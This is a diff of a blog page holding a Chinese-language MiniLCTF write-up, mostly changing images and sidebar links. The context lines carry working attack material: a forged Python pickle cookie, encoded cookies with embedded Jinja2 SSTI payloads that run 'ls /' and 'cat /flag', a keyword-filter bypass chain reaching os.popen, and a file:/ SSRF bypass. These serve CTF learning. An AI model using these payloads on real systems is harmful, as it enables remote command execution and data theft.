@@ -78,7 +78,7 @@ Canary = Canary's Blog</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">Symbols count in article</span>
-    <span>18k</span>
+    <span>17k</span>
     <span class="text">words</span>
   </span>
   <span class="item" title="Reading time">
@@ -119,12 +119,12 @@ Canary = Canary's Blog</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/51944-higehiro-PC-Wallpaper.jpg"></li>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/40953-imas-cinderella-ShimamuraUzuki-PC.jpg"></li>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/53967-LoveLive_Nijigasaki-MifuneShioriko-PC-Wallpaper.jpg"></li>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/54291-LoveLive_Nijigasaki-KonoeKanata-PC-Wallpaper.jpg"></li>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/54232-BanG_Dream-WakamiyaEve-PC-Wallpaper.jpg"></li>
-          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/46258-imoimo-PC-Wallpaper.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/43488-Imouto_sae_Irebaii-PC.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/49236-Kanokari-PC-Wallpaper.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/pic6.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/51224-projectSEKAI-KiritaniHaruka-PC-Wallpaper.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/20833_kin-iro_mosaic.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/32308-Netoge_no_Yome-PC.jpg"></li>
         </ul>
       </div>
     </header>
@@ -318,16 +318,16 @@ q12_1: ┤1                     ├──■──┤ X ├┤M├
 <p><code>flag:miniL&#123;edd0faa3-c21b-40da-ac82-53bf734299c9&#125;</code></p>
 <h2 id="l-inc"><a class="anchor" href="#l-inc">#</a> L inc.</h2>
 <p>经过一些尝试，得到题目的第一步应该是认证 vip 身份 抓包，看到 cookie 应该是 base64: <code>gASVLAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjANjeXOUjAN2aXCUiXViLg==</code>  用 python 解一下： <code>b'\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x04User\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x03cys\x94\x8c\x03vip\x94\x89ub.'</code>  结合 PHP 序列化的字符串，这个看起来也像是一个序列化字符串 实际上这就是 python 的序列化字符串， <code>cys</code>  前是它的长度 用 python 的 pickletools 处理一下（注意到 \x89 是 NEWFALSE 尝试一下 \x90,\x88）可知 <code>\x88</code>  是 NEWTRUE 将更改后的字符串 base64encode，作为 cookie 成功认证 vip 身份。</p>
-<p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvU2NyZWVuc2hvdA==">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/Screenshot</span> 2021-12-15 102706.png)</p>
-<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvU2NyZWVuc2hvdA==">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/Screenshot</span> 2021-12-15 102742.png&quot; style=&quot;zoom:200%;&quot; /&gt;</p>
+<p><img data-src="https://camo.githubusercontent.com/a54a8521d3be41470b88af434c3f865eec632998acba26f4124f44eaa551cdc7/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f31303636376238663337653937303462393232323333613835636238646465392e706e67" alt="" /></p>
+<p><img data-src="https://camo.githubusercontent.com/cea03f13f57dfd7fa0ef7f0085a808e184a6cd38fcc82cb62b7415ac75e92562/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35326133373537366536373938323535326565383666306534366433663234662e706e67" alt="" /></p>
 <p>并且可以看到前面的输入回显到了页面上，猜测是 SSTI 输入 <code>&#123;&#123;3*3&#125;&#125;</code>  成功回显 9 这里我做题时没来及的写脚本，所以是直接输入 payload，抓包，改包认证 vip 身份来做题的 paylaod: <strong>查目录</strong>  <code>gASVjwAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGZ7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdscyAvJykucmVhZCgpIikgfX2UjAN2aXCUiHViLg==</code>  <strong>查 flag</strong>  <code>gASVlAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGt7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdjYXQgL2ZsYWcnKS5yZWFkKCkiKSB9fZSMA3ZpcJSIdWIu</code></p>
-<p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvU2NyZWVuc2hvdA==">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/Screenshot</span> 2021-12-15 102938.png)</p>
-<p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvU2NyZWVuc2hvdA==">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/Screenshot</span> 2021-12-15 103026.png)</p>
+<p><img data-src="https://camo.githubusercontent.com/0819fd5ce56fd3c39735f814e73c9febc65cf87120f4337880cb7b92021bd606/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f64366433626363643132363539666163316338616132336261636137626136332e706e67" alt="" /></p>
+<p><img data-src="https://camo.githubusercontent.com/a094728e835a53600c499230e9d79adc9aeabc0b9c3ac5e328dbe2897dfdd44d/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f66363762343263616462393535623532373838356237636533396138333765352e706e67" alt="" /></p>
 <h2 id="template"><a class="anchor" href="#template">#</a> Template</h2>
 <p>这题拿了 ctf 生涯第一个一血 看题目名字大概可以确定这是一道模板注入的题目 经过简单的测试，可能是通过 JS 过滤了 <code>'&#123;''&#125;''%'</code> , 想到调试一下题目 JS 代码，看看能否去掉过滤 (这里稍稍与 lt 师傅出题时候的想法不一样，相当于走了个小捷径)， 进入到 JS 的源码部分，直接搜索 <code>&#123;</code> 找到进行过滤的代码位置，这里我设了断点，通过调试大概看了一下 submit 函数的执行流程，从界面直接获取输入，对输入内容进行黑名单搜索，搜到就会调用 alert () 结束代码的继续运行。所以直接把黑名单改掉，这里我直接啥也没过滤。 没有 JS 的过滤了，那么就可以进行模板注入了，首先常规的 <code>&#123;&#123;3*3&#125;&#125;</code>  得到回显 9，应该是 jinja2 的模板注入 经过简单的测试，过滤了 <code>'class','base','subclasses','init','flag','os','.','+','|',单引号</code>  这里‘|’过滤掉相当于过滤器基本用不了了，只能使用常规的 <code>&quot;&quot;.__class__.__base__.__subclasses__()</code>  链条去执行命令，jinja2 有个特性， <code>&quot;&quot;[&quot;__class__&quot;]==&quot;&quot;.__class__</code> ，基于此，可以通过 &quot; 进行字符拼接，利用这个特性绕过。以及关键词的过滤 一开始想着用这个链条 <code> x[&quot;__init__&quot;][&quot;__globals__&quot;][&quot;__getitem__&quot;](&quot;__builtins__&quot;)</code>  去调用命令执行模块，后来发现想的太简单了，可能由于 python 版本等诸多原因，这个 payload 在服务器端是打不通的 之后想通过遍历找到可以执行命令的模块，写了这个 payload: <code>&#123;% for c in ""["__cl""ass__"]["__ba""se__"]["__subcl""asses__"]() %&#125; &#123;% if c["__na""me__"] == "catch_warnings" %&#125; &#123;&#123;c["__in"it__"]["__getitem__"]["__globals__"]["__builtins__"]["eval"]("__import__(\"o\"\"s\")[\"system\"](\"ls /\")") &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</code>  但是可能由于相同的原因，这个 payload 也打不通 最后没办法只好通过手撕去查找，题目能利用的模块，我是用这个链条完全的手撕...(主要是最开始做题目虽然走了捷径，但也把思路禁锢在了直接在输入框中进行注入，没有想到抓包，写脚本跑一下) <code>&#123;&#123;""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[0]&#125;&#125;</code>  最后得到</p>
-<p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvU2NyZWVuc2hvdA==">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/Screenshot</span> 2021-12-15 103207.png)</p>
+<p><img data-src="https://camo.githubusercontent.com/3a16259342452d62bf8551c04b7536bcbd8c01fc69517409baadf05f7188836a/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f39346633343238386433386461633339303031363733663532643539623634622e706e67" alt="" /></p>
 <p>找到了可以执行命令的模块就什么都好说了 最终 payload:  <code>&#123;&#123;""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[177]["__in""it__"]["__globals__"]["__builtins__"]["__import__"]("o""s")["popen"]("ls /")["read"]()&#125;&#125;</code></p>
-<p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvU2NyZWVuc2hvdA==">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/Screenshot</span> 2021-12-15 103217.png)</p>
+<p><img data-src="https://camo.githubusercontent.com/95edf11f5500aebdce1ca7858d39bddb58fb23887fd238f0bfdceb1d0c1c7bc5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61363062373436393330376134643330356331616535396537393735346665362e706e67" alt="" /></p>
 <p><code>&#123;&#123;""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[177]["__in""it__"]["__globals__"]["__builtins__"]["__import__"]("o""s")["popen"]("cat /f*")["read"]()&#125;&#125;</code></p>
 <h2 id="protocol"><a class="anchor" href="#protocol">#</a> protocol</h2>
 <p>题目打开，是一个提示可以输入 URL 的框，猜测考察 SSRF 进行简单的手动测试，得到过滤了 <code>file://</code> , <code>dict</code> , <code>localhost</code> , <code>../</code>   <code>file://</code>  被过滤了，可以尝试 <code>file:/</code>  去绕过 POST 传参， <code>url=file:/var/www/html/index.php</code>  得到了页面的源码</p>
@@ -353,7 +353,7 @@ q12_1: ┤1                     ├──■──┤ X ├┤M├
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2021-12-15 12:52:50" itemprop="dateModified" datetime="2021-12-15T12:52:50+08:00">2021-12-15</time>
+    <time title="Modified: 2021-12-15 12:55:29" itemprop="dateModified" datetime="2021-12-15T12:55:29+08:00">2021-12-15</time>
   </span>
   <span id="MiniLCTF题解/" class="item leancloud_visitors" data-flag-title="MiniLCTF 题解" title="Views">
       <span class="icon">
@@ -416,7 +416,7 @@ q12_1: ┤1                     ├──■──┤ X ├┤M├
     <div class="item left">
       
 
-  <a href="/computer-science/Reverse/reverse2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zephyr-cyber&#x2F;Blog-Gallery@main&#x2F;&#x2F;blog-img&#x2F;pic3.jpg" title="学习Reverse2">
+  <a href="/computer-science/Reverse/reverse2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zephyr-cyber&#x2F;Blog-Gallery@main&#x2F;&#x2F;blog-img&#x2F;51944-higehiro-PC-Wallpaper.jpg" title="学习Reverse2">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> Reverse</span>
   <h3>学习Reverse2</h3>
@@ -574,6 +574,34 @@ q12_1: ┤1                     ├──■──┤ X ├┤M├
   <li class="item">
     
 <div class="breadcrumb">
+</div>
+
+    <span><a href="/markdown/" title="Markdown Style test">Markdown Style test</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/English/" title="In English">English</a>
+</div>
+
+    <span><a href="/English/" title="Learn English">Learn English</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/long-title/" title="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id.">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id.</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/computer-science/" title="In computer-science">computer-science</a>
 <i class="ic i-angle-right"></i>
 <a href="/categories/computer-science/Reverse/" title="In Reverse">Reverse</a>
@@ -588,40 +616,7 @@ q12_1: ┤1                     ├──■──┤ X ├┤M├
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/accumulate/" title="accumulate">accumulate</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/computer-science/" title="In computer-science">computer-science</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/computer-science/Misc/" title="In Misc">Misc</a>
-</div>
-
-    <span><a href="/computer-science/Misc/BUGKUmisc/" title="bugku-MISC">bugku-MISC</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/gallery-post/" title="Gallery Post">Gallery Post</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/psychology/" title="In psychology">psychology</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/psychology/ana/" title="In ana">ana</a>
-</div>
-
-    <span><a href="/psychology/ana/research/" title="chology">chology</a></span>
+    <span><a href="/code-highlight/" title="Code Highlight Style test">Code Highlight Style test</a></span>
   </li>
 
       
@@ -642,16 +637,7 @@ q12_1: ┤1                     ├──■──┤ X ├┤M├
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/tags/" title="Tags">Tags</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/tag-plugins/" title="Tag Plugins">Tag Plugins</a></span>
+    <span><a href="/hello-world/" title="Hello World">Hello World</a></span>
   </li>
 
       
@@ -667,14 +653,21 @@ q12_1: ┤1                     ├──■──┤ X ├┤M├
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Foo/" title="In Foo">Foo</a>
+<a href="/categories/computer-science/" title="In computer-science">computer-science</a>
 <i class="ic i-angle-right"></i>
-<a href="/categories/Foo/Bar/" title="In Bar">Bar</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/Foo/Bar/Baz/" title="In Baz">Baz</a>
+<a href="/categories/computer-science/Crypto/" title="In Crypto">Crypto</a>
 </div>
 
-    <span><a href="/categories/" title="Categories">Categories</a></span>
+    <span><a href="/computer-science/Crypto/Crypto/" title="Crypto">Crypto</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/images/" title="Images">Images</a></span>
   </li>
 
   </ul>
@@ -699,13 +692,13 @@ q12_1: ┤1                     ├──■──┤ X ├┤M├
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="Symbols count total">64k words</span>
+    <span title="Symbols count total">63k words</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="Reading time total">58 mins.</span>
+    <span title="Reading time total">57 mins.</span>
   </div>
   <div class="powered-by">
     Powered by <span class="exturl" data-url="aHR0cHM6Ly96ZXBoeXItY3liZXIuZ2l0aHViLmlv">Canary</span> & Inspire.<span class="exturl" data-url="aHR0cHM6Ly96ZXBoeXItY3liZXIuZ2l0aHViLmlv">taotaotao!</span>
